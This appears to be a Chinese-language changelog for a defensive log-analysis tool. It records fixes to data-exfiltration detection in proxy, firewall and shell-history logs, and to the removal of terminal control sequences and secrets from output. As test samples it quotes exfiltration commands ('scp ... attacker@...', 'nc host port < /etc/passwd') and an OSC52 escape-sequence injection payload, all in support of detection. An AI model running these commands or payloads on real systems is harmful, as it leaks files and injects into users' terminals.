- 只在 P0 parser 的字节归一化里增加清晰入站方向 veto，不改变 detector、correlation、output、remote 的职责边界。
- 只拦截 `inbound/ingress/download/server-to-client/s2c/入站/下行/下载/流入` 等明确入站语义；无方向字段的明确外发别名仍保持原行为。
- 不引入联网行为，不读取额外文件，不改变 remote 只读白名单。

### 验证命令
- `python3 -m pytest -q tests/test_p0_security.py::P0SecurityRegressionTests::test_p0_inbound_direction_vetoes_explicit_bytes_out_aliases`
- `python3 -m pytest -q tests/test_p0_security.py`
- `python3 -m compileall -q bla bla_cli.py setup.py tests`
- `python3 -m pytest -q`
- `python3 -m unittest discover -s tests -v`
- `python3 scripts/release_check.py`

### 验证结果
- 定点回归通过：`test_p0_inbound_direction_vetoes_explicit_bytes_out_aliases`。
- P0 回归通过：`tests/test_p0_security.py` 共 23 条。
- 发布级验证通过：`scripts/release_check.py` 通过，并覆盖 compileall、pytest、unittest、`validate-rules --strict-metadata`、ssh/remote-log help、1 MB benchmark、1 MB memory benchmark 和样例报告 smoke。

### 修改结果
- 已复现问题：`direction=inbound bytes_sent=209715200` 的 proxy 记录和 `direction=ingress upload_bytes=209715200` 的 firewall 记录会被误报为“代理大流量外发/防火墙大流量外联”，并触发 `P0-EXFIL-001`。
- 已新增 `_is_inbound_direction()`，让明确入站方向优先阻断外发字节归一化。
- 已新增回归测试，覆盖 proxy/firewall 中明确入站方向与显式字节别名冲突时不生成 P0 外传事件。

### 剩余问题
- 本轮未发现 P0/P1 已知问题。
- 当前工作树仍包含本轮之前已经存在的 CLI/JSON/release hardening 改动和 `soft-copyright-materials/` 未跟踪目录；本轮未回退或清理这些现场状态。

## 2026-05-29 - P0 Proxy Client-To-Server Bytes Aliases

### 本轮目标
- 修复 W3C/代理类 CSV 日志中 `cs-bytes` / client-to-server 上传字节不会触发 P0 数据外传的问题。
- 同时确认 `sc-bytes` / server-to-client 响应字节不会被误报为外发流量。

### 涉及模块
- `bla/parsers/p0_security.py`
- `tests/test_p0_security.py`

### 风险边界
- 只在 proxy/SWG P0 adapter 中扩展 client-to-server 字节别名，不把 `cs-bytes` 泛化到 firewall/NAT。
- 不改变 P0 外传阈值、detector 聚合、correlation 语义或 output 格式。
- 不引入联网行为，不读取额外文件，不改变 remote 只读白名单。

### 验证命令
- `python3 -m pytest -q tests/test_p0_security.py::P0SecurityRegressionTests::test_p0_proxy_csv_accepts_client_to_server_bytes_only`
- `python3 -m pytest -q tests/test_p0_security.py`
- `python3 -m compileall -q bla bla_cli.py setup.py tests`
- `python3 -m pytest -q`
- `python3 -m unittest discover -s tests -v`
- `python3 scripts/release_check.py`

### 验证结果
- 定点回归通过：`test_p0_proxy_csv_accepts_client_to_server_bytes_only`。
- P0 回归通过：`tests/test_p0_security.py` 共 22 条。
- 发布级验证通过：`scripts/release_check.py` 通过，并覆盖 compileall、pytest、unittest、`validate-rules --strict-metadata`、ssh/remote-log help、1 MB benchmark、1 MB memory benchmark 和样例报告 smoke。

### 修改结果
- 已复现问题：`log_type=proxy cs_bytes=209715200` 不生成 P0 事件，也不会触发 `P0-EXFIL-001`。
- 已将 proxy/SWG 的 client-to-server 字节别名纳入外发归一化，覆盖 `cs-bytes/cs_bytes`、`client_to_server_bytes`、`c2s_bytes` 等常见写法。
- 已保留 `sc-bytes` 为响应/下载方向，不作为外发字节别名。
- 已新增 CSV 回归测试，覆盖大 `cs-bytes` 触发和大 `sc-bytes` 不触发。

### 剩余问题
- 本轮未发现 P0/P1 已知问题。
- 当前工作树仍包含本轮之前已经存在的 CLI/JSON/release hardening 改动和 `soft-copyright-materials/` 未跟踪目录；本轮未回退或清理这些现场状态。

## 2026-05-29 - P0 Direction-Aware Generic Bytes

### 本轮目标
- 修复 P0 proxy/firewall 对泛用 `bytes` 字段缺少方向判断的问题，避免 `direction=inbound/ingress` 的大下载或入站流量被误报为数据外传。
- 保留明确外发字段和明确 `direction=outbound/egress` 的泛用 `bytes` 检测能力。

### 涉及模块
- `bla/parsers/p0_security.py`
- `tests/test_p0_security.py`

### 风险边界
- 只改变 P0 parser 对字节方向的解释，不改变 detector 聚合、不改变外传阈值、不改变 parser/detector/correlation/output/remote 的职责边界。
- `response_bytes` 不再作为外发字节别名；外发以 `request_bytes/upload_bytes/sent_bytes/out_bytes/tx_bytes/bytes_sent` 等明确别名，或带 outbound/egress/upload 方向的泛用 `bytes` 为准。
- 不引入网络行为，不读取额外文件，不改变 remote 只读白名单。

### 验证命令
- `python3 -m pytest -q tests/test_p0_security.py::P0SecurityRegressionTests::test_p0_generic_bytes_respects_traffic_direction`
- `python3 -m pytest -q tests/test_p0_security.py`
- `python3 -m compileall -q bla bla_cli.py setup.py tests`
- `python3 -m pytest -q`
- `python3 -m unittest discover -s tests -v`
- `python3 scripts/release_check.py`

### 验证结果
- 定点回归通过：`test_p0_generic_bytes_respects_traffic_direction`。
- P0 回归通过：`tests/test_p0_security.py` 共 21 条。
- 发布级验证通过：`scripts/release_check.py` 通过，并覆盖 compileall、pytest、unittest、`validate-rules --strict-metadata`、ssh/remote-log help、1 MB benchmark、1 MB memory benchmark 和样例报告 smoke。

### 修改结果
- 已复现问题：`direction=inbound bytes=209715200` 的 proxy/firewall 记录会被误报为“代理大流量外发/防火墙大流量外联”，并触发 `P0-EXFIL-001`；同时 `details["bytes_out"]` 仍为 `0`。
- 已将泛用 `bytes` 改为只有明确 outbound/egress/upload 方向时才参与外发判断。
- 已把 `details["bytes_out"]` 和触发逻辑统一到方向感知 `_bytes_out()`。
- 已新增回归测试，覆盖 outbound/egress 泛用 `bytes` 仍触发、inbound/ingress 泛用 `bytes` 不触发、单独 `response_bytes` 不触发。

### 剩余问题
- 本轮未发现 P0/P1 已知问题。
- 当前工作树仍包含本轮之前已经存在的 CLI/JSON/release hardening 改动和 `soft-copyright-materials/` 未跟踪目录；本轮未回退或清理这些现场状态。

## 2026-05-29 - P0 Bytes Out Alias Compatibility

### 本轮目标
- 修复 P0 proxy/firewall 大流量外发检测只识别少数字节字段的问题，兼容真实设备常见的 `request_bytes`、`bytes_sent`、`tx_bytes`、`bytes_uploaded` 等外发导出字段。

### 涉及模块
- `bla/parsers/p0_security.py`
- `tests/test_p0_security.py`

### 风险边界
- 只扩展 P0 parser 对“外发字节数”字段名的归一化，不改变阈值、不改变 detector 聚合逻辑、不改变事件/告警职责边界。
- 不引入联网行为，不读取额外文件，不改变 remote 只读白名单。
- 对 `details["bytes_out"]` 使用同一套归一化，避免 parser 触发逻辑和输出字段不一致。

### 验证命令
- `python3 -m pytest -q tests/test_p0_security.py::P0SecurityRegressionTests::test_p0_proxy_and_firewall_accept_common_bytes_out_aliases`
- `python3 -m pytest -q tests/test_p0_security.py`
- `python3 -m compileall -q bla bla_cli.py setup.py tests`
- `python3 -m pytest -q`
- `python3 -m unittest discover -s tests -v`
- `python3 scripts/release_check.py`

### 验证结果
- 定点回归通过：`test_p0_proxy_and_firewall_accept_common_bytes_out_aliases`。
- P0 回归通过：`tests/test_p0_security.py` 共 20 条。
- 发布级验证通过：`scripts/release_check.py` 通过，并覆盖 compileall、pytest、unittest、`validate-rules --strict-metadata`、ssh/remote-log help、1 MB benchmark、1 MB memory benchmark 和样例报告 smoke。

### 修改结果
- 已复现现状：`request_bytes=209715200` 的 proxy 记录和 `bytes_sent=209715200` 的 firewall 记录不会生成任何 P0 事件，也不会触发 `P0-EXFIL-001`。
- 已新增 `_bytes_out()` 字段归一化，覆盖 `bytes_out/bytesout/sent_bytes/sentbytes/bytes_sent/bytessent/upload_bytes/uploadbytes/bytes_uploaded/bytesuploaded/out_bytes/outbytes/tx_bytes/txbytes/request_bytes/requestbytes`。
- 已将 proxy/firewall 大流量外发判断和 `details["bytes_out"]` 切到同一套归一化。
- 已新增回归测试，覆盖 proxy `request_bytes`、firewall `bytes_sent`，并断言触发 `P0-EXFIL-001`。

### 剩余问题
- 本轮未发现 P0/P1 已知问题。
- 当前工作树仍包含本轮之前已经存在的 CLI/JSON/release hardening 改动和 `soft-copyright-materials/` 未跟踪目录；本轮未回退或清理这些现场状态。

## 2026-05-29 - Shell History Data Exfiltration Detection

### 本轮目标
- 补齐 Shell History 中常见本地文件外传命令的解析和告警能力，覆盖 `scp/rsync` 上传、`curl --upload-file/-T/-F file=@`、`nc < file` 等场景。

### 涉及模块
- `bla/parsers/shell_history.py`
- `bla/detection/engine.py`
- `tests/test_parsers.py`
- `tests/test_detection.py`

### 风险边界
- Parser 只把命令历史归一为 `LogEvent`，不直接生成告警；Detector 通过 `DetectorRegistry` 新增独立 `data-exfiltration` detector，并使用 selector 预筛 `shell-exfiltration/data-exfiltration` 事件。
- 不改变 CLI、pipeline、correlation、output 和 remote 的职责边界。
- 不引入联网行为，不读取额外文件，不扩大 remote 命令白名单。
- 避免把远端下载到本地的 `scp analyst@host:/tmp/report ./report` 误判为外传。

### 验证命令
- `python3 -m pytest -q tests/test_parsers.py::ParserRegressionTests::test_shell_history_parser_detects_data_exfiltration_commands`
- `python3 -m pytest -q tests/test_detection.py::DetectionRegressionTests::test_shell_history_data_exfiltration_creates_alert_and_incident`
- `python3 -m pytest -q tests/test_parsers.py tests/test_detection.py`
- `python3 -m compileall -q bla bla_cli.py setup.py tests`
- `python3 -m pytest -q`
- `python3 -m unittest discover -s tests -v`
- `python3 scripts/release_check.py`

### 验证结果
- 定点回归通过：`test_shell_history_parser_detects_data_exfiltration_commands`。
- 定点回归通过：`test_shell_history_data_exfiltration_creates_alert_and_incident`。
- Parser/Detector 相关回归通过：`tests/test_parsers.py tests/test_detection.py` 共 71 条。
- 发布级验证通过：`scripts/release_check.py` 通过，并覆盖 compileall、pytest、unittest、`validate-rules --strict-metadata`、ssh/remote-log help、1 MB benchmark、1 MB memory benchmark 和样例报告 smoke。

### 修改结果
- 已复现现状：`scp /var/backups/db.sql.gz attacker@...:/tmp/` 和 `nc host port < /etc/passwd` 不生成事件，`curl --upload-file ...` 被归为普通远程工具下载。
- 已新增 Shell History 外传命令识别，输出 `Shell 数据外传命令` 事件，MITRE `T1041`，标签 `shell-exfiltration/data-exfiltration`。
- 已新增 `EXFIL-001` 检测器，通过 registry 注册并使用 selector 预筛事件，生成数据外传告警、攻击链阶段和处置建议。
- 已新增 parser 和 detector 回归测试，覆盖正常外传命令、inbound `scp` 非外传样本和 Windows 本地盘符目标非外传样本。

### 剩余问题
- 本轮未发现 P0/P1 已知问题。
- 当前工作树仍包含本轮之前已经存在的 CLI/JSON/release hardening 改动和 `soft-copyright-materials/` 未跟踪目录；本轮未回退或清理这些现场状态。

## 2026-05-29 - Fatal Traceback Terminal Sanitization

### 本轮目标
- 修复顶层 fatal exception handler 中 `traceback.print_exc()` 绕过已清洗错误摘要的问题，避免异常消息里的 OSC/ANSI 控制字符和 token/password 等敏感片段进入终端。

### 涉及模块
- `bla/utils/helpers.py`
- `bla/cli/main.py`
- `bla_cli.py`
- `tests/test_release_hygiene.py`

### 风险边界
- 只改变未预期异常的终端 traceback 展示文本，不改变正常 CLI 参数、解析、检测、关联、报告写入或退出码语义。
- 保留 traceback 结构用于本地调试，但对整段 traceback 做控制字符清理和 secret 脱敏。
- 不引入网络行为，不改变 remote 只读白名单边界。

### 验证命令
- `python3 -m pytest -q tests/test_release_hygiene.py::ReleaseHygieneRegressionTests::test_fatal_traceback_redacts_terminal_output`
- `python3 -m pytest -q tests/test_release_hygiene.py`
- `python3 -m compileall -q bla bla_cli.py setup.py tests`
- `python3 -m pytest -q`
- `python3 -m unittest discover -s tests -v`
- `python3 scripts/release_check.py`

### 验证结果
- 定点回归通过：`test_fatal_traceback_redacts_terminal_output`。
- Release hygiene 回归通过：`tests/test_release_hygiene.py` 共 12 条。
- 发布级验证通过：`scripts/release_check.py` 通过，并覆盖 compileall、pytest、unittest、`validate-rules --strict-metadata`、ssh/remote-log help、1 MB benchmark、1 MB memory benchmark 和样例报告 smoke。

### 修改结果
- 已复现问题：兼容入口 `bla_cli.py` 的 fatal handler 会先打印已清洗摘要，然后通过原始 `traceback.print_exc()` 再次泄漏 ESC/OSC payload 和 `token=super-secret`。
- 已新增共享 `print_sanitized_traceback`，对格式化 traceback 统一执行 `sanitize_report_text` 后再写入 stderr。
- 已将 `bla_cli.py` 和 `python -m bla.cli.main` 的 fatal handler 切换为清洗后的 traceback 输出。
- 已新增回归测试，断言 fatal traceback 不包含 ESC、OSC payload 或原始 secret，并保留 `Traceback` 和 `token=<redacted>`。

### 剩余问题
- 本轮未发现 P0/P1 已知问题。
- 当前工作树仍包含本轮之前已经存在的 CLI/JSON/release hardening 改动和 `soft-copyright-materials/` 未跟踪目录；本轮未回退或清理这些现场状态。

## 2026-05-29 - Output Path Terminal Sanitization

### 本轮目标
- 修复报告产物写入提示中输出路径未统一清洗的问题，避免恶意文件名或目录名把 OSC/ANSI 控制字符、token/password 等敏感片段带入终端。

### 涉及模块
- `bla/output/bundle.py`
- `bla/output/html_report.py`
- `bla/output/json_report.py`
- `bla/output/csv_report.py`
- `bla/output/sarif_report.py`
- `bla/output/manifest.py`
- `tests/test_outputs.py`

### 风险边界
- 只改变终端提示里的显示文本，不改变真实输出路径、报告内容结构、解析/检测/关联语义。
- 不引入网络访问，不改变 HTML 离线渲染方式。
- 不触碰 remote 任意命令边界。

### 验证命令
- `python3 -m pytest -q tests/test_outputs.py::OutputRegressionTests::test_report_bundle_sanitizes_terminal_output_paths`
- `python3 -m pytest -q tests/test_outputs.py`
- `python3 -m compileall -q bla bla_cli.py setup.py tests`
- `python3 -m pytest -q`
- `python3 -m unittest discover -s tests -v`
- `python3 scripts/release_check.py`

### 验证结果
- 定点回归通过：`test_report_bundle_sanitizes_terminal_output_paths`。
- 输出模块回归通过：`tests/test_outputs.py` 全部通过。
- 发布级验证通过：`scripts/release_check.py` 通过，并覆盖 compileall、pytest、unittest、`validate-rules --strict-metadata`、ssh/remote-log help、1 MB benchmark、1 MB memory benchmark 和样例报告 smoke。

### 修改结果
- 已复现问题：恶意输出目录名包含 OSC52 控制序列和 `token=super-secret` 时，报告 bundle 成功提示会把控制字符和 secret 原样写到终端。
- 已修复 bundle、HTML、JSON、CSV、SARIF、manifest 的报告保存提示，统一对输出路径调用 `sanitize_report_text`。
- 已新增 `test_report_bundle_sanitizes_terminal_output_paths`，覆盖恶意输出目录下的完整报告 bundle 生成，并断言终端输出不包含 OSC/BEL 控制字符和原始 secret。

### 剩余问题
- 本轮未发现 P0/P1 已知问题。
- 当前工作树仍包含本轮之前已经存在的 CLI/JSON/release hardening 未提交改动和 `soft-copyright-materials/` 未跟踪目录；本轮未回退或清理这些现场状态。

## 2026-05-29 - CLI Failure Path Secret Redaction

### 本轮目标
- 修复 CLI/Remote 报告写入失败和异常提示中只去除控制字符、不脱敏 secret 的问题。
- 让终端清洗同时覆盖 Python 异常字符串中被 repr 成 `\x1b...\x07` 的转义控制序列，避免 OSC payload 以文本形式留在 stderr。

### 涉及模块
- `bla/utils/helpers.py`
- `bla/cli/main.py`
- `bla_cli.py`
- `bla/remote/ssh_workspace.py`
- `tests/test_release_hygiene.py`
- `tests/test_remote_workspace.py`

### 风险边界
- 只改变终端/错误展示文本，不改变真实文件路径、不改变 parser/detector/correlation 语义。
- 不引入网络行为，不改变 remote 采集命令白名单。
- 不改变 JSON/CSV/HTML/SARIF/manifest 文件结构。

### 验证命令
- `python3 -m pytest -q tests/test_release_hygiene.py::ReleaseHygieneRegressionTests::test_cli_report_write_failure_redacts_terminal_output`
- `python3 -m pytest -q tests/test_remote_workspace.py::RemoteWorkspaceRegressionTests::test_remote_workspace_report_write_error_redacts_terminal_output`
- `python3 -m pytest -q tests/test_release_hygiene.py tests/test_remote_workspace.py tests/test_outputs.py`
- `python3 -m compileall -q bla bla_cli.py setup.py tests`
- `python3 -m pytest -q`
- `python3 -m unittest discover -s tests -v`
- `python3 scripts/release_check.py`

### 验证结果
- 定点回归通过：本地 CLI 报告写入失败不再泄漏 OSC payload 或 `super-secret`。
- 定点回归通过：Remote Workspace 报告写入失败不再泄漏 OSC payload 或 `super-secret`。
- 受影响测试组通过：`tests/test_release_hygiene.py tests/test_remote_workspace.py tests/test_outputs.py` 共 50 条。
- 发布级验证通过：`scripts/release_check.py` 通过，并覆盖 compileall、pytest、unittest、`validate-rules --strict-metadata`、ssh/remote-log help、1 MB benchmark、1 MB memory benchmark 和样例报告 smoke。

### 修改结果
- 已复现问题：当 `--json` 指向名为 `\x1b]52;c;SGVsbG8=\x07token=super-secret` 的目录时，CLI 报告写入失败会在 stderr 中泄漏 `super-secret` 和 OSC payload 文本。
- 已将 CLI 主入口、兼容 shim、Remote Workspace 的异常展示从仅去控制字符改为 `sanitize_report_text`。
- 已增强 `strip_terminal_control`，让 Python 异常中以文本形式出现的 `\x1b...\x07`、`\x1b[...` 等转义控制序列也会被清理。
- 已新增本地 CLI 和 Remote Workspace 两条失败分支回归测试。

### 剩余问题
- 本轮未发现 P0/P1 已知问题。
- 当前工作树仍包含本轮之前已经存在的 CLI/JSON/release hardening 改动和 `soft-copyright-materials/` 未跟踪目录；本轮未回退或清理这些现场状态。

## 2026-05-29 - Remote Workspace pwd Sanitization

### 本轮目标
- 修复 Remote Workspace `pwd` 命令直接打印 `self.cwd` 的问题，避免初始 cwd 或远端 `pwd -P` 返回值中的控制字符和 secret 进入终端。

### 涉及模块
- `bla/remote/ssh_workspace.py`
- `tests/test_remote_workspace.py`

### 风险边界
- 只改变 `pwd` 命令的展示文本，不改变 `self.cwd` 内部值、不改变远端命令构造和目录解析。
- 不扩大 remote 命令白名单，不新增远端写入或联网行为。
- 不改变 parser/detector/correlation/output 文件结构。

### 验证命令
- `python3 -m pytest -q tests/test_remote_workspace.py::RemoteWorkspaceRegressionTests::test_remote_workspace_pwd_redacts_terminal_output`
- `python3 -m pytest -q tests/test_remote_workspace.py`
- `python3 -m compileall -q bla bla_cli.py setup.py tests`
- `python3 -m pytest -q`
- `python3 -m unittest discover -s tests -v`
- `python3 scripts/release_check.py`

### 验证结果
- 定点回归通过：`test_remote_workspace_pwd_redacts_terminal_output`。
- Remote 工作区回归通过：`tests/test_remote_workspace.py` 共 16 条。
- 发布级验证通过：`scripts/release_check.py` 通过，并覆盖 compileall、pytest、unittest、`validate-rules --strict-metadata`、ssh/remote-log help、1 MB benchmark、1 MB memory benchmark 和样例报告 smoke。

### 修改结果
- 已复现问题：Remote Workspace 的 `pwd` 在 `cwd=/var/log/\x1b]52;c;SGVsbG8=\x07-token=super-secret` 时会原样输出 ESC/OSC payload 和 `super-secret`。
- 已修复 Remote Workspace `pwd` 输出，展示当前目录时统一走 `_display_text`。
- 已新增回归测试，断言 `pwd` 输出不包含 ESC、OSC payload 或原始 secret，并保留 `token=<redacted>` 语义。

### 剩余问题
- 本轮未发现 P0/P1 已知问题。
- 当前工作树仍包含本轮之前已经存在的 CLI/JSON/release hardening 改动和 `soft-copyright-materials/` 未跟踪目录；本轮未回退或清理这些现场状态。

## 2026-05-29 - Remote Workspace ls Argument Sanitization

### 本轮目标
- 修复 Remote Workspace `ls` 对不支持参数报错时直接打印用户输入参数的问题，避免 remote 交互工作台错误出口泄漏控制字符和 secret。

### 涉及模块
- `bla/remote/ssh_workspace.py`
- `tests/test_remote_workspace.py`

### 风险边界
- 只改变 `ls` 参数校验失败的终端展示，不改变允许的 remote 命令集合和远端只读边界。
- 不改变 `ls` 正常路径解析、白名单命令构造、fetch/tail/grep 分析流程。
- 不引入网络行为，不改变 parser/detector/correlation/output 文件结构。

### 验证命令
- `python3 -m pytest -q tests/test_remote_workspace.py::RemoteWorkspaceRegressionTests::test_remote_workspace_ls_argument_error_redacts_terminal_output`
- `python3 -m pytest -q tests/test_remote_workspace.py`
- `python3 -m compileall -q bla bla_cli.py setup.py tests`
- `python3 -m pytest -q`
- `python3 -m unittest discover -s tests -v`
- `python3 scripts/release_check.py`

### 验证结果
- 定点回归通过：`test_remote_workspace_ls_argument_error_redacts_terminal_output`。
- Remote 工作区回归通过：`tests/test_remote_workspace.py` 共 15 条。
- 发布级验证通过：`scripts/release_check.py` 通过，并覆盖 compileall、pytest、unittest、`validate-rules --strict-metadata`、ssh/remote-log help、1 MB benchmark、1 MB memory benchmark 和样例报告 smoke。

### 修改结果
- 已复现问题：Remote Workspace 执行 `ls --\x1b]52;c;SGVsbG8=\x07-token=super-secret` 时，stderr 会原样输出 ESC/OSC payload 和 `super-secret`。
- 已修复 Remote Workspace `ls` 不支持参数错误展示，参数值统一走 `_display_text`。
- 已新增回归测试，断言错误输出不包含 ESC、OSC payload 或原始 secret，并保留 `token=<redacted>` 语义。

### 剩余问题
- 本轮未发现 P0/P1 已知问题。
- 当前工作树仍包含本轮之前已经存在的 CLI/JSON/release hardening 改动和 `soft-copyright-materials/` 未跟踪目录；本轮未回退或清理这些现场状态。

## 2026-05-29 - argparse Failure Path Terminal Sanitization

### 本轮目标
- 修复 argparse 在 invalid choice / unrecognized arguments 等参数解析失败路径中直接打印用户输入参数的问题，避免还没进入业务逻辑时就把恶意控制序列和 secret 打到终端。

### 涉及模块
- `bla/utils/helpers.py`
- `bla/cli/main.py`
- `bla/remote/ssh_workspace.py`
- `tests/test_release_hygiene.py`
- `tests/test_remote_workspace.py`

### 风险边界
- 只改变 argparse 错误消息的终端展示，不改变参数定义、默认值、choices、退出码或正常 `--help` 输出语义。
- 不改变 parser/detector/correlation/output 文件结构。
- Remote workspace 仍只解析受限 `bla` 采集参数，不扩大远端命令白名单，不引入远端写入或联网行为。

### 验证命令
- `python3 -m pytest -q tests/test_release_hygiene.py::ReleaseHygieneRegressionTests::test_argparse_errors_redact_terminal_output`
- `python3 -m pytest -q tests/test_remote_workspace.py::RemoteWorkspaceRegressionTests::test_remote_workspace_argparse_error_redacts_terminal_output`
- `python3 -m pytest -q tests/test_release_hygiene.py tests/test_remote_workspace.py`
- `python3 -m compileall -q bla bla_cli.py setup.py tests`
- `python3 -m pytest -q`
- `python3 -m unittest discover -s tests -v`
- `python3 scripts/release_check.py`

### 验证结果
- 定点回归通过：主 CLI 和 `remote-log` 子命令的 argparse invalid choice 错误不再泄漏 OSC payload 或原始 secret。
- 定点回归通过：Remote Workspace 内部 `bla` 参数解析失败不再泄漏 OSC payload 或原始 secret。
- 受影响测试组通过：`tests/test_release_hygiene.py tests/test_remote_workspace.py` 共 25 条。
- 发布级验证通过：`scripts/release_check.py` 通过，并覆盖 compileall、pytest、unittest、`validate-rules --strict-metadata`、ssh/remote-log help、1 MB benchmark、1 MB memory benchmark 和样例报告 smoke。

### 修改结果
- 已复现问题：主 CLI `--exit-on` invalid choice 中包含 `\x1b]52;c;SGVsbG8=\x07-token=super-secret` 时，argparse 会在 stderr 中打印 `\x1b` 文本 payload 和原始 `super-secret`。
- 已新增 `SafeArgumentParser`，在 argparse `error()` 输出前统一调用 `sanitize_report_text`。
- 已将主 CLI、CLI 子命令和 Remote Workspace 内部 `bla` 参数解析切换到 `SafeArgumentParser`。
- 已新增主 CLI/子命令和 Remote Workspace 两条回归测试，覆盖 invalid choice 失败路径。

### 剩余问题
- 本轮未发现 P0/P1 已知问题。
- 当前工作树仍包含本轮之前已经存在的 CLI/JSON/release hardening 改动和 `soft-copyright-materials/` 未跟踪目录；本轮未回退或清理这些现场状态。

## 2026-05-29 - explain Failure Path Terminal Sanitization

### 本轮目标
- 修复 `bla explain` 在报告读取失败、找不到目标 ID 时直接打印用户输入 `--report` 路径或 `id` 的问题，避免恶意路径/ID 向终端注入控制字符并泄漏 secret。

### 涉及模块
- `bla/cli/main.py`
- `tests/test_release_hygiene.py`

### 风险边界
- 只改变 `bla explain` 错误提示的终端展示，不改变 JSON 报告读取、alert/incident 匹配、text/markdown 正常输出语义。
- 不改变 parser、detector、correlation、output 文件结构。
- 不引入网络行为，不扩大 remote 能力。

### 验证命令
- `python3 -m pytest -q tests/test_release_hygiene.py::ReleaseHygieneRegressionTests::test_explain_failure_paths_redact_terminal_output`
- `python3 -m pytest -q tests/test_release_hygiene.py`
- `python3 -m compileall -q bla bla_cli.py setup.py tests`
- `python3 -m pytest -q`
- `python3 -m unittest discover -s tests -v`
- `python3 scripts/release_check.py`

### 验证结果
- 定点回归通过：`test_explain_failure_paths_redact_terminal_output`。
- Release hygiene 回归通过：`tests/test_release_hygiene.py` 共 10 条。
- 发布级验证通过：`scripts/release_check.py` 通过，并覆盖 compileall、pytest、unittest、`validate-rules --strict-metadata`、ssh/remote-log help、1 MB benchmark、1 MB memory benchmark 和样例报告 smoke。

### 修改结果
- 已复现问题：恶意 `--report` 路径和未命中 `id` 包含 `\x1b]52;c;SGVsbG8=\x07 token=super-secret` 时，`bla explain` 会把 ESC/OSC payload 和原始 secret 打到 stderr。
- 已修复 `bla explain` 的报告读取失败错误展示，`--report` 路径和异常文本统一走 `sanitize_report_text`。
- 已修复 `bla explain` 的未命中 ID 错误展示，目标 ID 统一走 `sanitize_report_text`。
- 已新增回归测试，同时覆盖报告不可读和报告可读但 ID 未命中两条失败路径。

### 剩余问题
- 本轮未发现 P0/P1 已知问题。
- 当前工作树仍包含本轮之前已经存在的 CLI/JSON/release hardening 改动和 `soft-copyright-materials/` 未跟踪目录；本轮未回退或清理这些现场状态。

## 2026-05-29 - validate-rules Terminal Sanitization

### 本轮目标
- 修复 `validate-rules` 打印自定义规则 issue 时未清洗 `source` / `rule` / `message` 的问题，避免恶意规则目录或规则 ID 向终端注入控制字符并泄漏 secret。

### 涉及模块
- `bla/cli/main.py`
- `tests/test_release_hygiene.py`

### 风险边界
- 只改变 CLI 终端展示，不改变 `validate_web_attack_rules()` 返回的结构化校验结果。
- 不改变规则加载、规则匹配、detector 注册或 Web 检测语义。
- 不引入网络行为，不影响 HTML/JSON/CSV/SARIF/manifest 文件结构。

### 验证命令
- `python3 -m pytest -q tests/test_release_hygiene.py::ReleaseHygieneRegressionTests::test_validate_rules_output_redacts_untrusted_rule_metadata`
- `python3 -m pytest -q tests/test_release_hygiene.py`
- `python3 bla_cli.py validate-rules --strict-metadata`
- `python3 -m compileall -q bla bla_cli.py setup.py tests`
- `python3 -m pytest -q`
- `python3 -m unittest discover -s tests -v`
- `python3 scripts/release_check.py`

### 验证结果
- 定点回归通过：`test_validate_rules_output_redacts_untrusted_rule_metadata`。
- Release hygiene 回归通过：`tests/test_release_hygiene.py` 共 9 条。
- 规则校验通过：`python3 bla_cli.py validate-rules --strict-metadata`。
- 发布级验证通过：`scripts/release_check.py` 通过，并覆盖 compileall、pytest、unittest、`validate-rules --strict-metadata`、ssh/remote-log help、1 MB benchmark、1 MB memory benchmark 和样例报告 smoke。

### 修改结果
- 已复现问题：当 `--rules` 指向名为 `\x1b]52;c;SGVsbG8=\x07token=super-secret` 的目录时，`validate-rules --strict-metadata` 会在 stdout 中打印 ESC/OSC payload 和原始 secret。
- 已修复 `_cmd_validate_rules` 的 issue 输出，`source`、`rule`、`message` 统一走 `sanitize_report_text` 后再打印。
- 已新增回归测试，覆盖恶意规则目录名、缺失规则元数据、ReDoS warning 的混合失败路径，并断言 stdout 不含 ESC、OSC payload 或原始 secret。

### 剩余问题
- 本轮未发现 P0/P1 已知问题。
- 当前工作树仍包含本轮之前已经存在的 CLI/JSON/release hardening 改动和 `soft-copyright-materials/` 未跟踪目录；本轮未回退或清理这些现场状态。

## 2026-05-29 - Remote Audit JSON Local Name Sanitization

### 本轮目标
- 修复 remote `--audit-json` 中 `local_name` 字段可能保留远程文件名里的 OSC payload 和 secret 的问题。
- 保持 remote 采集仍然只读、限量、可审计，不改变实际临时文件路径和采集命令。

### 涉及模块
- `bla/remote/ssh_workspace.py`
- `tests/test_remote_workspace.py`

### 风险边界
- 只清洗审计/manifest 展示字段，不改变远端读取命令、grep/tail 逻辑、拉取文件内容和检测结果。
- 不引入网络行为，不扩大 remote 命令白名单。
- 不改变主报告 JSON/CSV/HTML/SARIF 结构。

### 验证命令
- `python3 -m pytest -q tests/test_remote_workspace.py::RemoteWorkspaceRegressionTests::test_remote_workspace_audit_json_sanitizes_local_name`
- `python3 -m pytest -q tests/test_remote_workspace.py`
- `python3 -m compileall -q bla bla_cli.py setup.py tests`
- `python3 -m pytest -q`
- `python3 -m unittest discover -s tests -v`
- `python3 scripts/release_check.py`

### 验证结果
- 定点回归通过：`test_remote_workspace_audit_json_sanitizes_local_name`。
- Remote 工作区回归通过：`tests/test_remote_workspace.py` 共 13 条。
- 发布级验证通过：`scripts/release_check.py` 通过，并覆盖 compileall、pytest、unittest、`validate-rules --strict-metadata`、ssh/remote-log help、1 MB benchmark、1 MB memory benchmark 和样例报告 smoke。

### 修改结果
- 已复现问题：恶意远程路径 `/var/log/\x1b]52;c;SGVsbG8=\x07token=super-secret.log` 经过 `--audit-json` 后，`collection[0].local_name` 中仍包含原始 secret 和 OSC payload。
- 已修复 remote input manifest 和 collection audit record 的 `local_name` 展示字段，统一走 `_display_text`。
- 已在写出 `--audit-json` 前增加递归清洗兜底，避免后续新增审计字段绕过清洗。
- 已新增回归测试，同时断言 audit JSON 和 manifest 的 remote collection 区域不包含 ESC、OSC payload 或原始 secret。

### 剩余问题
- 本轮未发现 P0/P1 已知问题。
- 当前工作树仍包含本轮之前已经存在的 CLI/JSON/release hardening 改动和 `soft-copyright-materials/` 未跟踪目录；本轮未回退或清理这些现场状态。
